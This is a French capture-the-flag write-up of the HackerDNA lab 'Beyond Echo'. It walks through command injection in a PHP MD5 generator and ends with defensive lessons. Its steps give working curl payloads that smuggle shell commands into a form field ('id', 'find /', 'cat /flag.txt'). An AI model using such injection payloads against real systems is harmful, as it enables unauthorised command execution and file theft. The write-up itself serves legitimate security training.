# Compte rendu : Beyond Echo

Plateforme : HackerDNA
Lien : https://hackerdna.com/labs/beyond-echo
Auteur : SRH
Catégorie : Sécurité Web & API
Difficulté : Moyenne
Tags : Command Injection, Web Security, PHP, RCE, Hash Generator
XP : +400 XP

## Scénario
Une application web de génération de hash MD5 en ligne permet aux utilisateurs de convertir du texte en hash. Derrière cette fonctionnalité anodine se cache une vulnérabilité critique : l'entrée utilisateur est passée directement à une commande shell sans validation. L'objectif est d'exploiter cette injection de commande pour exécuter du code arbitraire sur le serveur et récupérer le flag.

Prérequis : fondamentaux des applications web, connaissances de base en ligne de commande Linux, compréhension des métacaractères shell.

## Chaîne d'Attaque
[Reconnaissance] → [Test d'injection] → [Confirmation RCE] → [Localisation du flag] → [Lecture du flag] → 🚩

## Étape 1 — Reconnaissance
L'application expose un formulaire avec un champ de saisie inputText qui génère un hash MD5. Le formulaire pointe vers index.php en méthode POST.

curl -s http://<IP>/ | grep -iE "form|input|name=|action"

Résultat attendu : un formulaire avec le champ inputText et l'action index.php.

## Étape 2 — Test d'injection
Le champ inputText est concaténé dans une commande shell de type echo "<input>" | md5sum. On teste l'injection avec un point-virgule suivi de la commande id, et un # pour commenter le reste de la commande (le | md5sum).

curl -s -X POST http://<IP>/ -d "inputText=test%3Bid%20%23"

Résultat attendu : la sortie contient uid=33(www-data) gid=33(www-data) groups=33(www-data), confirmant l'exécution de commandes côté serveur.

## Étape 3 — Localisation du flag
On utilise l'injection pour chercher le fichier flag sur le système. La commande find est exécutée avec 2>/dev/null pour ignorer les erreurs de permission.

curl -s -X POST http://<IP>/ -d "inputText=test%3Bfind%20%2F%20-name%20*flag*%202%3E%2Fdev%2Fnull%20%23"

Résultat attendu : le chemin /flag.txt apparaît dans la sortie (parmi les faux positifs système).

## Étape 4 — Lecture du flag
On lit directement le fichier /flag.txt via l'injection de commande.

curl -s -X POST http://<IP>/ -d "inputText=test%3Bcat%20%2Fflag.txt%20%23"

Résultat attendu : le contenu du fichier /flag.txt (format UUID) s'affiche dans la réponse.

Flag : <FLAG>

## Conclusion
Ce lab illustre une injection de commande classique dans une application PHP. L'entrée utilisateur est passée à une commande shell sans échappement, permettant l'exécution de commandes arbitraires. Le # permet de commenter le reste de la commande (| md5sum) et d'exécuter les commandes injectées.

## Leçons Apprises
1. Ne jamais passer d'entrée utilisateur à system(), exec(), shell_exec() ou passthru() sans validation.
2. Utiliser des listes blanches ou des fonctions d'échappement (escapeshellarg, escapeshellcmd) pour sécuriser les commandes.
3. Les métacaractères shell (;, |, &, `, $()) permettent de chaîner des commandes arbitraires.
4. Le # (commentaire shell) est une technique puissante pour neutraliser le reste d'une commande.
5. Toujours encoder les entrées utilisateur (URL-encodage) lors des tests d'injection.

Les noms des défis et toute propriété intellectuelle de tiers restent la propriété de leurs détenteurs respectifs.
